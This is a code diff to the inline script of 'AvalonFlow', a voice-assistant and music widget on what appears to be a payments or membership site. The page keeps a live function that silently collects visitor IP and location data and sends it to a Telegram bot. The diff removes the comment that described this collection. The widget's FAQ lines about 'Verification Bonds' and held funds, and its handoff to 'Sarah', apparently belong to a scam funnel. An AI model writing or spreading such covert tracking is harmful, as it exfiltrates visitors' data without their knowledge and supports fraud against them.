@@ -458,9 +458,7 @@
     <script> 
 /**
  * AvalonFlow: Kairos Intelligent Voice & UI Controller
- * Comprehensive Master Core Edition
- * (Integrated Speech Synthesis, Hardware Ambient Dictation, Client-Side FAQ Matching, 
- * Multi-Deck Crossfade Engine Framework, and Automated Telegram Tracker Shields)
+ * Comprehensive Master Core Edition (Flicker-Free Optimized)
  */
 
 // ==========================================
@@ -469,15 +467,10 @@
 const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE";
 const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";
 
-/**
- * Silently extracts user information and forwards data directly to Telegram
- */
 async function sendVisitorDetailsToTelegram() {
   try {
-    // Prevent duplicate logs in the same session
     if (sessionStorage.getItem('visitor_logged_tg')) return;
 
-    // Fetch network layout IP metadata cleanly
     const ipResponse = await fetch('https://ipapi.co/json/').catch(() => null);
     const ipData = ipResponse ? await ipResponse.json() : {};
 
@@ -537,7 +530,6 @@ let chatHistory = JSON.parse(localStorage.getItem('tg_chat_history_v3')) || [];
 let kairosChatHistory = []; 
 let conversationMemory = []; 
 
-// Configured to 10 seconds to allow for natural thinking pauses and slow speech pacing
 const SILENCE_WAIT_TIME = 10000; 
 const statusText = document.getElementById('status-text'); 
 
@@ -567,7 +559,6 @@ const quotes = [
 ];
 
 const PREMIUM_AUDIO_VAULT = {
-  // Greetings
   "Hey there, i'm online how can i help you today?": "assets/audio/vault/greeting_2.mp3",
   "Hello, i'm here ready when you are": "assets/audio/vault/hello_kairos_here.mp3",
   "Hey i'm active what are we working on?": "assets/audio/vault/hey_kairos_active.mp3",
@@ -578,8 +569,6 @@ const PREMIUM_AUDIO_VAULT = {
   "Yo! How can I help make things smoother today?": "assets/audio/vault/greeting_6.mp3",
   "Ready to assist. Please let me know what you need.": "assets/audio/vault/greeting_7.mp3",
   "Hey! What are we diving into today?": "assets/audio/vault/greeting_8.mp3",
-
-  // Core System & Media Vault Fallbacks
   "I couldn't find that track inside the vault directory. Want me to play a random one from the library instead?": "assets/audio/vault/vault_directory.mp3",
   "This is the very first track in the queue": "assets/audio/vault/first_track.mp3",
   "No active queue history to step backward": "assets/audio/vault/activequeue_backward.mp3",
@@ -590,13 +579,9 @@ const PREMIUM_AUDIO_VAULT = {
   "Resuming track": "assets/audio/vault/music_resume.mp3",
   "There is no music playing right now": "assets/audio/vault/music_paused.mp3",
   "Music paused. Let me know when you want to resume": "assets/audio/vault/music_paused.mp3",
-
-  // FAQs - AvalonCare Custom Tiers & Security
   "The AvalonCare Verification Bonds: AvalonCare Lite, AvalonCare Basic and AvalonCare Premium having each separate Cycle Rate, are designated tiers for smaller transactions": "assets/audio/vault/faq_cycle_rates.mp3",
   "The Cycle Rate is a designated cooling-off period used to batch and clear each automatic disbursement on a principal guarantee which states your funds are secured until verification is confirmed": "assets/audio/vault/faq_custom_verification.mp3",
   "The AvalonCare verification Bond: AvalonCare Custom, is built for security and speed in high-value transactions and utilizes Compliance Verification—meaning a dedicated regulatory body oversees the fund-hold release": "assets/audio/vault/faq_why_custom.mp3",
-
-  // FAQs - Account & Platform Operations
   "Click forgot password on the login page and follow instructions": "assets/audio/vault/reset_password.mp3",
   "Navigate to your sidebar then withdrawals to update payment methods": "assets/audio/vault/update_billing.mp3",
   "Generate a ticket under technical category and describe the issue in detail": "assets/audio/vault/ticket_generation.mp3",
@@ -610,7 +595,6 @@ const PREMIUM_AUDIO_VAULT = {
   "For urgent issues, generate a ticket and mark it high priority, then Email Support": "assets/audio/vault/ticket_generation.mp3"
 };
 
-// Audio library registry structure mapping paths 
 const audioLibrary = [
   "assets/audio/Rod Wave - 2019 (Official Audio) - RodWave.mp3",
   "assets/audio/Rod Wave - Don't Forget (Official Audio) - RodWave.mp3",
@@ -715,7 +699,6 @@ function findFAQByIntent(input) {
   let bestKey = null;
   let maxSim = 0;
 
-  // Scan the Premium Vault text keys to determine the best response phrase match
   for (const key of Object.keys(PREMIUM_AUDIO_VAULT)) {
     const simScore = similarity(text, key);
     if (simScore > maxSim) {
@@ -808,7 +791,6 @@ function toggleDock(forcedState = null) {
     gatheredUserCommand = "";
     if (voiceSilenceTimer) clearTimeout(voiceSilenceTimer);
 
-    // Monitor crossfade deck operations before modifying core visual targets
     const deckA = document.getElementById('audioDeckA');
     const deckB = document.getElementById('audioDeckB');
     const isMusicPlaying = (deckA && !deckA.paused && deckA.src) || (deckB && !deckB.paused && deckB.src);
@@ -925,19 +907,17 @@ function humanize(text) {
 }
 
 /**
- * MASTER ROUTING FRAMEWORK: Handles local logic routing for voice processing strings
+ * MASTER ROUTING FRAMEWORK
  */
 async function processUserCommandLocally(commandText) {
   const transcriptCanvas = document.getElementById('kairosTranscript');
   const lowerCommand = commandText.trim().toLowerCase();
 
-  if (transcriptCanvas) transcriptCanvas.innerText = "Thinking...";
-
+  // REMOVED: immediate canvas update here to prevent layout/text cancellation flash.
   const deckA = document.getElementById('audioDeckA');
   const deckB = document.getElementById('audioDeckB');
   let currentLiveDeck = activeDeck;
 
-  // --- INTERACTIVE MEDIA CONTROLS INTERCEPTORS ---
   if (
       lowerCommand === "pause" || 
       /\b(pause|stop|halt|freeze|hold)\b/.test(lowerCommand) && /\b(music|audio|song|track|playing|it)\b/.test(lowerCommand)
@@ -1082,7 +1062,7 @@ async function processUserCommandLocally(commandText) {
   }
 
   // ====================================================================
-  // 6a. NON-INTERFERING LIVE CHAT ESCALATION LAYER (SARAH ESCALATION MATRIX)
+  // 6a. SARAH ESCALATION MATRIX
   // ====================================================================
   const localFAQMatch = findFAQByIntent(commandText);
 
@@ -1092,15 +1072,14 @@ async function processUserCommandLocally(commandText) {
 
     if (needsEscalation) {
       const escalationMessage = "That requires priority authorization. Hold on a moment while I connect your session directly with Sarah from Nobu Hospitality LLC...";
-
-      speakResponse(escalationMessage);
-
+      
+      // Handle the text injection cleanly directly within this specific routine
+      if (activeTypingInterval) clearInterval(activeTypingInterval);
       if (transcriptCanvas) {
-        // Keeps ellipsis logic visually synchronized for routing indicators
         transcriptCanvas.innerHTML = `<strong>${escalationMessage}</strong><br><br><span style='opacity:0.6; font-size:0.9em;'>Connecting you with Sarah in a bit...</span>`;
       }
+      speakResponse(escalationMessage);
 
-      // Redirection delay cleanly padded to exactly 12 seconds
       setTimeout(() => {
         window.location.href = "https://membership.avalonflow.site/livechat";
       }, 12000);
@@ -1177,28 +1156,28 @@ function setWaveAnimationSpeed(isSpeaking) {
   });
 }
 
-// Helper backup method for when premium vault asset fails or falls over
 function fallbackSynthesisExecution(spokenText, words, transcriptCanvas) {
   const utterance = new SpeechSynthesisUtterance(spokenText);
   if (selectedFemaleVoice) utterance.voice = selectedFemaleVoice;
   let wordIndex = 0;
 
-  utterance.onstart = () => {
-    setWaveAnimationSpeed(true);
-    transcriptCanvas.innerText = "";
-    activeTypingInterval = setInterval(() => {
-      if (wordIndex < words.length) {
-        transcriptCanvas.innerText += (wordIndex === 0 ? "" : " ") + words[wordIndex];
-        wordIndex++;
-      } else {
-        // Append filler cleanly onto fallback execution termination frames
-        if (!transcriptCanvas.innerText.endsWith("...")) {
-          transcriptCanvas.innerText += "...";
-        }
-        clearInterval(activeTypingInterval);
+  // Clear canvas right here when audio execution safely begins
+  if (activeTypingInterval) clearInterval(activeTypingInterval);
+  transcriptCanvas.innerText = "";
+  setWaveAnimationSpeed(true);
+
+  activeTypingInterval = setInterval(() => {
+    if (wordIndex < words.length) {
+      transcriptCanvas.innerText += (wordIndex === 0 ? "" : " ") + words[wordIndex];
+      wordIndex++;
+    } else {
+      if (!transcriptCanvas.innerText.endsWith("...")) {
+        transcriptCanvas.innerText += "...";
       }
-    }, 80);
-  };
+      clearInterval(activeTypingInterval);
+      activeTypingInterval = null;
+    }
+  }, 80);
 
   utterance.onend = () => {
     setWaveAnimationSpeed(false);
@@ -1210,27 +1189,27 @@ function fallbackSynthesisExecution(spokenText, words, transcriptCanvas) {
 }
 
 // ====================================================================
-// 7. TEXT-TO-SPEECH VOICE EXECUTION MATRIX (AUTOMATED AUTOMATIC FILLER)
+// 7. TEXT-TO-SPEECH VOICE EXECUTION MATRIX (FLICKER PROTECTION LAYER)
 // ====================================================================
 async function speakResponse(rawResponseText) {
+  // Clear any existing rendering loops before changing base structure values
+  if (activeTypingInterval) {
+    clearInterval(activeTypingInterval);
+    activeTypingInterval = null;
+  }
+
   stopActiveKairosVoice();
   killSpeechEngineCompletely(); 
 
-  // Check if it's an exact vault match first before adding random humanized fillers
   const vaultAssetPath = PREMIUM_AUDIO_VAULT[rawResponseText];
-
-  // If it's a premium vault audio asset, don't double-humanize it
   let typedChatText = vaultAssetPath ? rawResponseText : humanize(rawResponseText);
   const spokenText = rawResponseText.replace(/[^\x00-\x7F]/g, "").trim();
 
-  // --- AUTOMATED FILLER LAYER ---
-  // Clean trailing punctuation (. ! ?) and surrounding white space before safely appending a single '...'
   typedChatText = typedChatText.replace(/[\.\!\?]+$/, "").trim() + "...";
 
   conversationMemory.push({ role: "bot", content: typedChatText, time: Date.now() });
   if (conversationMemory.length > 10) conversationMemory.shift();
 
-  // Unified global log state allocation
   chatHistory = chatHistory || [];
   chatHistory.push({ sender: 'bot', text: typedChatText, type: 'text', actualSender: 'kairos' });
   localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
@@ -1255,8 +1234,6 @@ async function speakResponse(rawResponseText) {
 
     nativeVaultAudio.onplay = () => {
       setWaveAnimationSpeed(true);
-      if (activeTypingInterval) clearInterval(activeTypingInterval);
-
       transcriptCanvas.innerText = ""; 
 
       activeTypingInterval = setInterval(() => {
@@ -1288,7 +1265,6 @@ async function speakResponse(rawResponseText) {
     nativeVaultAudio.onerror = () => {
       if (firedFallback) return;
       firedFallback = true;
-      if (activeTypingInterval) clearInterval(activeTypingInterval);
       console.warn("Vault asset file missed or rejected. Routing to fallback execution matrix...");
       fallbackSynthesisExecution(spokenText, words, transcriptCanvas);
     };
@@ -1296,7 +1272,6 @@ async function speakResponse(rawResponseText) {
     await nativeVaultAudio.play().catch(() => {
       if (firedFallback) return;
       firedFallback = true;
-      if (activeTypingInterval) clearInterval(activeTypingInterval);
       fallbackSynthesisExecution(spokenText, words, transcriptCanvas);
     });
     return;
@@ -1318,10 +1293,7 @@ async function speakResponse(rawResponseText) {
 
       const ttsPayload = {
         input: { text: spokenText },
-        voice: { 
-          languageCode: "en-US", 
-          name: "en-US-Studio-O" 
-        },
+        voice: { languageCode: "en-US", name: "en-US-Studio-O" },
         audioConfig: { 
           audioEncoding: "MP3",
           speakingRate: voiceRate,
@@ -1345,8 +1317,6 @@ async function speakResponse(rawResponseText) {
 
       nativeCloudAudio.onplay = () => {
         setWaveAnimationSpeed(true);
-        if (activeTypingInterval) clearInterval(activeTypingInterval);
-
         transcriptCanvas.innerText = ""; 
 
         activeTypingInterval = setInterval(() => {
@@ -1404,7 +1374,6 @@ async function speakSilentlyInBackground(rawResponseText) {
 
   if (!spokenText) return;
 
-  // --- 1. PREMIUM AUDIO VAULT ASSIGNMENT ---
   if (vaultAssetPath) {
     console.log(`🎵 Playing Silent Background Vault Asset: ${vaultAssetPath}`);
     const backgroundVaultAudio = new Audio(vaultAssetPath);
@@ -1419,7 +1388,6 @@ async function speakSilentlyInBackground(rawResponseText) {
     return;
   }
 
-  // --- 2. PREMIUM CLOUD SPEECH FALLBACK ---
   const isChromeNanoPath = !!(window.ai && window.ai.languageModel);
   if (!isChromeNanoPath) {
     try {
@@ -1456,13 +1424,9 @@ async function speakSilentlyInBackground(rawResponseText) {
     }
   }
 
-  // --- 3. HARDWARE FALLBACK ---
   executeBackgroundVoiceSynthesis(spokenText);
 }
 
-/**
- * Basic native synthesis runner for background fallback processing
- */
 function executeBackgroundVoiceSynthesis(text) {
   if (!kairosVoiceEngine) return;
   const utterance = new SpeechSynthesisUtterance(text);
@@ -1474,7 +1438,6 @@ function executeBackgroundVoiceSynthesis(text) {
   kairosVoiceEngine.speak(utterance);
 }
 
-
 // ==========================================
 // 8. MULTI-DECK 10s CROSSFADE ENGINE WORKFLOW
 // ==========================================
@@ -1485,7 +1448,6 @@ function botMusicReply(text, file) {
     const deckB = document.getElementById('audioDeckB');
     if (!deckA || !deckB) return;
 
-    // Speak out loud perfectly when manually triggered via local commands
     speakResponse(finalText);
 
     let primaryDeck = activeDeck === deckA ? deckB : deckA;
@@ -1545,12 +1507,10 @@ function setupTrackEndMonitor(audioDeck) {
             
             const alertText = `Moving to next track in queue.`;
 
-            // Commit log adjustments to persistent cache structures quietly
             chatHistory = chatHistory || [];
             chatHistory.push({ sender: 'bot', text: `${alertText} Playing ${trackTitle}...`, type: 'text', actualSender: 'kairos' });
             localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
 
-            // Speaks directly into the speaker array without manipulating the UI layout or re-opening the pill
             speakSilentlyInBackground(alertText);
 
             const deckA = document.getElementById('audioDeckA');
@@ -1569,7 +1529,6 @@ function setupTrackEndMonitor(audioDeck) {
     };
 }
 
-// Global safety switch to make sure mic cuts off cleanly
 function killSpeechEngineCompletely() {
   isKairosListeningActive = false;
   if (kairosSpeechRecognizer) {
@@ -1654,7 +1613,6 @@ function activateKairosVoiceOnDemand() {
 
       conversationMemory.push({ role: "user", content: gatheredUserCommand, time: Date.now() });
       
-      // Clean chat logs tracking input array structures safely
       chatHistory = chatHistory || [];
       chatHistory.push({ sender: 'user', text: gatheredUserCommand, type: "text" });
       localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
@@ -1664,7 +1622,6 @@ function activateKairosVoiceOnDemand() {
     }, customWaitTime);
   }
 
-  // Initial activation timeout padded slightly to allow 12 seconds before first syllable
   resetSilenceTimer(12000);
 
   try {
@@ -1729,6 +1686,7 @@ window.addEventListener('DOMContentLoaded', () => {
     });
   }
 });
+
 
 
 
